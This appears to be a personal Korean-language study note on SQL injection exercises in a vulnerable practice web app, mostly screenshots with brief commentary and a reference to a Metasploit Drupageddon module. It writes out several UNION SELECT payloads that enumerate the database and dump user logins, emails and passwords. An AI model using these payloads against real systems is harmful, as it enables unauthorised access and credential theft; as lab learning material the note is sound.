# SQL_Injection(GET/Search)
---
![[Pasted image 20241010142112.png]]
- spider를 입력하면 나오는 결과
![[Pasted image 20241010142145.png]]
![[Pasted image 20241010142202.png]]
- 잘못된 구문에도 일일이 반응한다.
![[Pasted image 20241010142253.png]]
![[Pasted image 20241010142313.png]]
## union select
![[Pasted image 20241010142503.png]]
- 칼럼 순서를 확인할 수 있다.
![[Pasted image 20241010142620.png]]
```
'union select 1,database(),@@datadir,system_user(),@@version,6,7#
```
![[Pasted image 20241010142850.png]]
- 칼럼에 원하는 정보를 출력하도록 명령어를 삽입할 수 있다.

```
'union select 1,table_name,3,4,5,6,7 from information_schema.tables#
```
![[Pasted image 20241010143205.png]]

```
'union select 1,column_name,3,4,5,6,7 from information_schema.columns#
```
![[Pasted image 20241010143506.png]]

```
0'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name="users"#
```
![[Pasted image 20241010143813.png]]

```
0'union select 1,id,login,email,password,6,7 from users#
```
![[Pasted image 20241010144049.png]]

medium
![[Pasted image 20241010144349.png]]
= 구문 뒤에 \\를 통해 sql 구문을 일반 문자열로 인식되도록 한다.


# SQL Injection (GET/Select)
---
![[Pasted image 20241010144726.png]]


# SQL Injection (AJAX/JSON/jQuery)
---
AJAX: Asynchronous JavaScript and XML(비동기 자바스크립트 xml)
![[Pasted image 20241010151347.png]]
- 아무 반응이 없다.
![[Pasted image 20241010151531.png]]

# SQL Injection (Login Form/Hero)
---
![[Pasted image 20241010151738.png]]![[Pasted image 20241010151807.png]]
![[Pasted image 20241010151830.png]]
-
```
' union select 1,2,3,4#
```
![[Pasted image 20241010151924.png]]

-
```
' union select 1,@@version,3,system_user()#
```
![[Pasted image 20241010152323.png]]

# SQL Injection (Login Form/User)
---

# SQL Injection (SQLite)
---
![[Pasted image 20241010152538.png]]
![[Pasted image 20241010152640.png]]![[Pasted image 20241010152655.png]]
![[Pasted image 20241010153021.png]]
딱히 보여주는 정보는 없다.

![[Pasted image 20241010153121.png]]
![[Pasted image 20241010153110.png]]![[Pasted image 20241010153341.png]]
![[Pasted image 20241010153326.png]]

# Drupal SQL Injection (Drupageddon)
![[Pasted image 20241010153555.png]]
## 메타익스플로잇
![[Pasted image 20241010154456.png]]
![[Pasted image 20241010154601.png]]
![[Pasted image 20241010154658.png]]
![[Pasted image 20241010155001.png]]
![[Pasted image 20241010155052.png]]
[[meterpreter]]

## Self


# SQL Injection - Stored (User-Agent)
---
![[Pasted image 20241010162459.png]]
다운로드시 proxy tool로 주고 받는 파라미터에 sql 인젝션 시도

# SQL Injection - Stored (XML)
---
![[Pasted image 20241010162628.png]]